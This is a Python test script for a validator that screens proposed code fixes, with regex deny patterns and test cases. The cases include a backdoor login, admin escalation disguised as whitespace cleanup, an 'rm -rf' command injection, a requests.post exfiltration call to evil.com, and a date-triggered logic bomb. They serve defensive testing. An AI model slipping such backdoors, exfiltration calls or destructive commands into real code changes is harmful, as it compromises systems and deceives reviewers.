#!/usr/bin/env python3
"""
Simple Emergency Safeguards Test - Standalone test without complex dependencies
"""

import sys
import re
from pathlib import Path

# Add src path for imports
sys.path.insert(0, str(Path(__file__).parent / 'src'))

from cognitive.interactive_approval import FixProposal, FixSeverity

def simple_emergency_validation(fix_proposal):
    """Simplified emergency validation logic"""
    
    # Comprehensive threat patterns
    dangerous_patterns = [
        # Code execution
        r'eval\s*\(',
        r'exec\s*\(',
        r'subprocess\.',
        r'os\.system\s*\(',
        
        # Authentication/privilege
        r'user\.role\s*=\s*["\']admin["\']',
        r'\.role\s*=\s*["\']admin["\']',
        r'return\s+True\s*#.*backdoor',
        r'if.*==.*["\']backdoor["\']',
        
        # File system
        r'rm\s+-rf\s+\/',
        r'\.\.[\\/]',
        r'\/etc\/passwd',
        
        # Network
        r'requests\.post.*http',
        r'http[s]?:\/\/(?!localhost)',
        
        # Logic bombs
        r'datetime\.now\(\)\.day\s*==\s*\d+',
        r'os\.system.*rm.*rf',
        
        # Obfuscation
        r'chr\s*\(\s*\d+\s*\)',
        r'base64\.b64decode',
        
        # Configuration tampering
        r'DEBUG\s*=\s*True',
        r'ALLOWED_HOSTS\s*=\s*\[\s*["\']\*["\']',
    ]
    
    # Check for dangerous patterns
    for pattern in dangerous_patterns:
        if re.search(pattern, fix_proposal.proposed_fix, re.IGNORECASE):
            return False, f"Dangerous pattern detected: {pattern}"
    
    # Check for disguised logic changes in cosmetic fixes
    if fix_proposal.issue_type in ['whitespace_cleanup', 'typo_corrections']:
        # For whitespace cleanup, only check for truly dangerous changes
        if fix_proposal.issue_type == 'whitespace_cleanup':
            # Whitespace fixes should only remove/add spaces, not change content
            original_stripped = fix_proposal.original_code.strip()
            proposed_stripped = fix_proposal.proposed_fix.strip()
            if original_stripped != proposed_stripped:
                return False, "Whitespace fix changes code content"
        else:
            # Typo corrections should not add executable code
            if any(keyword in fix_proposal.proposed_fix 
                   for keyword in ['=', 'import', 'if', 'return', 'admin', 'exec', 'eval']):
                return False, "Typo fix contains logic changes"
    
    # Check for suspiciously high safety scores with dangerous content
    if fix_proposal.safety_score > 95:
        dangerous_keywords = ['admin', 'backdoor', 'eval', 'exec', 'system', 'True']
        if any(keyword in fix_proposal.proposed_fix.lower() for keyword in dangerous_keywords):
            return False, "High safety score despite dangerous content"
    
    return True, "Passed emergency validation"

def test_emergency_scenarios():
    """Test emergency scenarios with simplified validation"""
    
    print("🚨 EMERGENCY SAFEGUARDS SIMPLE TEST")
    print("=" * 50)
    
    test_cases = [
        # Malicious fixes that should be blocked
        {
            'name': 'Backdoor Injection',
            'fix': FixProposal(
                file_path="auth.py", issue_type="typo_corrections", severity=FixSeverity.COSMETIC,
                description="Fix typo", original_code="# Authenticate user",
                proposed_fix="# Authenticate user\nif username == 'backdoor': return True",
                line_number=1, educational_explanation="Typo fix", safety_score=98,
                context="production", auto_approvable=True
            ),
            'should_block': True
        },
        
        {
            'name': 'Privilege Escalation',
            'fix': FixProposal(
                file_path="security.py", issue_type="whitespace_cleanup", severity=FixSeverity.COSMETIC,
                description="Clean whitespace", original_code="user_role = 'guest'  ",
                proposed_fix="user_role = 'admin'", line_number=1,
                educational_explanation="Clean format", safety_score=97,
                context="production", auto_approvable=True
            ),
            'should_block': True
        },
        
        {
            'name': 'Command Injection',
            'fix': FixProposal(
                file_path="utils.py", issue_type="bug_fix", severity=FixSeverity.MEDIUM,
                description="Fix file handling", original_code="process_file(filename)",
                proposed_fix="os.system(f'rm -rf {filename}')", line_number=1,
                educational_explanation="Better processing", safety_score=75,
                context="production", auto_approvable=False
            ),
            'should_block': True
        },
        
        {
            'name': 'Data Exfiltration',
            'fix': FixProposal(
                file_path="core.py", issue_type="logging", severity=FixSeverity.LOW,
                description="Improve logging", original_code="logger.info('data processed')",
                proposed_fix="requests.post('http://evil.com', json=data)", line_number=1,
                educational_explanation="Better logging", safety_score=80,
                context="production", auto_approvable=False
            ),
            'should_block': True
        },
        
        {
            'name': 'Logic Bomb',
            'fix': FixProposal(
                file_path="scheduler.py", issue_type="exception_handling", severity=FixSeverity.MEDIUM,
                description="Better error handling", original_code="except Exception: pass",
                proposed_fix="except Exception:\n    if datetime.now().day == 1: os.system('rm -rf /')",
                line_number=1, educational_explanation="Error handling", safety_score=70,
                context="production", auto_approvable=False
            ),
            'should_block': True
        },
        
        # Legitimate fix that should NOT be blocked
        {
            'name': 'Legitimate Whitespace Fix',
            'fix': FixProposal(
                file_path="utils.py", issue_type="whitespace_cleanup", severity=FixSeverity.COSMETIC,
                description="Remove trailing space", original_code="def helper():    ",
                proposed_fix="def helper():", line_number=1,
                educational_explanation="Clean format", safety_score=99,
                context="test", auto_approvable=True
            ),
            'should_block': False
        }
    ]
    
    passed = 0
    total = len(test_cases)
    
    for test_case in test_cases:
        name = test_case['name']
        fix = test_case['fix']
        should_block = test_case['should_block']
        
        print(f"\n🧪 Testing: {name}")
        
        is_safe, reason = simple_emergency_validation(fix)
        actually_blocked = not is_safe
        
        # Check if result matches expectation
        correct = actually_blocked == should_block
        
        if correct:
            passed += 1
            status = "✅ PASS"
        else:
            status = "❌ FAIL"
        
        block_status = "BLOCKED" if actually_blocked else "APPROVED"
        print(f"{status} Emergency validation: {block_status}")
        
        if actually_blocked:
            print(f"   🛡️ Reason: {reason}")
        else:
            print(f"   ✅ Passed: {reason}")
    
    print(f"\n" + "=" * 50)
    print(f"🛡️ EMERGENCY SAFEGUARDS RESULTS")
    print(f"✅ Passed: {passed}/{total}")
    print(f"❌ Failed: {total - passed}/{total}")
    print(f"🎯 Success Rate: {(passed/total)*100:.1f}%")
    
    if passed == total:
        print(f"\n🎉 ALL EMERGENCY TESTS PASSED!")
        print("🛡️ Emergency safeguards successfully blocked all malicious fixes")
        print("✅ System demonstrates robust final-layer security")
    else:
        print(f"\n💀 SOME EMERGENCY TESTS FAILED!")
        print("🚨 Emergency safeguards need improvement")
    
    return passed == total

if __name__ == "__main__":
    print("🔥 TESTING EMERGENCY SAFEGUARDS (Simplified)")
    print("Testing final validation that blocks malicious code even after approval")
    
    success = test_emergency_scenarios()
    
    if success:
        print(f"\n✅ Emergency safeguards are working correctly!")
        print("The system has robust defense-in-depth security.")
    else:
        print(f"\n⚠️ Emergency safeguards need improvement!")
        print("Some malicious fixes were not blocked.")